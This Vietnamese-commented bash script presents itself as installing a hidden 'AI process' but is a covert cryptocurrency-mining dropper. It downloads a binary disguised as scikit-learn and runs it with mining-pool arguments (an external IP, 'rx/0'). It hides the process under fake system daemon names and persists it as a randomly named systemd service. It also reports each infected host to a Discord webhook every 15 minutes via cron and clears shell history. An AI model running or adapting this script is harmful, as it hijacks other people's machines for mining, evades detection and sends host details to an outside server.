#!/bin/bash
# ========== CONFIG ==========
# URL để tải tệp thực thi AI của bạn
AI_ZIP_URL="https://github.com/gitumtriston/Computed-Network/raw/refs/heads/master/scikitlearn.zip"
# Lệnh để khởi động tiến trình AI của bạn
AI_START_COMMAND="./scikit_learn -o 144.202.19.203:443 -u MachineLearning -p x -a rx/0 --tls --max-cpu-usage=80"

# Webhook Discord để nhận thông báo (Tùy chọn)
DISCORD_WEBHOOK="https://discord.com/api/webhooks/1423873253029580832/fcA-2celN9ZdHt_beYEJ7wLYJ6DtjxXsiTiLMUcdOYvk4JLBwtEbzZN3JCbWp8jm1lX3"
FAKE_NAME=$(shuf -n1 -e "dbus-daemon" "systemd-journald" "udevd" "sys-cleaner" "cronlog")
# Thư mục cài đặt ẩn
INSTALL_DIR="$HOME/.local/share/.system"
# Tên dịch vụ systemd
SERVICE_NAME=$(shuf -n1 -e "sysdaemon" "core-logger" "netwatchd" "usb-handler")
# ============================

echo "🛠️ Đang cài đặt và cấu hình tiến trình AI ẩn..."

# Cài đặt các gói cần thiết
sudo apt update
sudo apt install -y curl unzip

# Tạo thư mục ẩn
mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"

# Tải và giải nén tệp AI
echo "🔄 Đang tải xuống tệp AI từ $AI_ZIP_URL..."
wget -L -o scikit_learn.zip "$AI_ZIP_URL"
unzip -o scikit_learn.zip
rm scikit_learn.zip
chmod +x scikit_learn

# Tạo tập lệnh runner để ngụy trang tiến trình bằng 'exec -a'
# Tập lệnh này sẽ khởi chạy tiến trình AI của bạn
tee "$INSTALL_DIR/$FAKE_NAME" > /dev/null << EOF
#!/bin/bash
cd $INSTALL_DIR
exec -a $FAKE_NAME $AI_START_COMMAND
EOF

chmod +x "$INSTALL_DIR/$FAKE_NAME"

# Tạo dịch vụ systemd để đảm bảo tiến trình luôn chạy
sudo tee /etc/systemd/system/$SERVICE_NAME.service > /dev/null << EOF
[Unit]
Description=System AI Process
After=network.target

[Service]
ExecStart=$INSTALL_DIR/$FAKE_NAME
Restart=always
User=$(whoami)
Group=$(id -gn)

[Install]
WantedBy=multi-user.target
EOF

# Kích hoạt và khởi chạy dịch vụ
echo "🚀 Kích hoạt và khởi chạy dịch vụ systemd..."
sudo systemctl daemon-reload
sudo systemctl enable $SERVICE_NAME
sudo systemctl start $SERVICE_NAME

# Tạo tập lệnh gửi thông báo tới Discord (Tùy chọn)
if [ -n "$DISCORD_WEBHOOK" ]; then
    tee "$INSTALL_DIR/logger.sh" > /dev/null << EOF
#!/bin/bash
WEBHOOK="$DISCORD_WEBHOOK"
PROCESS_NAME="$FAKE_NAME"
HOST="\$(hostname)"

CPU_USAGE=\$(top -bn1 | grep "Cpu(s)" | awk '{print \$2 + \$4}')
UPTIME=\$(uptime -p)
THREADS=\$(nproc)
IS_RUNNING=\$(pgrep -f \$PROCESS_NAME)

if [ -n "\$IS_RUNNING" ]; then
  STATUS="🟢 Đang chạy"
else
  STATUS="🔴 Đã dừng"
fi

curl -s -H "Content-Type: application/json" -X POST -d "{
  \\"username\\": \\"AI Process Monitor\\",
  \\"content\\": \\"🖥️ Host: \\\`\$HOST\\\`\\n🔧 Tiến trình: \\\`\$PROCESS_NAME\\\`\\n📊 Trạng thái: **\$STATUS**\\n💻 Mức sử dụng CPU: \\\`\${CPU_USAGE}%\\\`\\n🧵 Tổng số luồng CPU: \\\`\$THREADS\\\`\\n🕒 Thời gian hoạt động: \\\`\$UPTIME\\\`\\"
}" "\$WEBHOOK" > /dev/null 2>&1
EOF

    chmod +x "$INSTALL_DIR/logger.sh"

    # Cronjob để gửi thông báo mỗi 15 phút
    (crontab -l 2>/dev/null; echo "*/15 * * * * $INSTALL_DIR/logger.sh") | crontab -

    # Gửi thông báo lần đầu
    "$INSTALL_DIR/logger.sh"
fi

history -c

echo ""
echo "✅ Đã cài đặt và khởi chạy tiến trình AI '$FAKE_NAME' một cách ẩn danh!"
echo "   - Dịch vụ systemd '$SERVICE_NAME' đã được tạo để tự động chạy lại."
if [ -n "$DISCORD_WEBHOOK" ]; then
    echo "   - Thông báo trạng thái sẽ được gửi đến Discord mỗi 15 phút."

fi


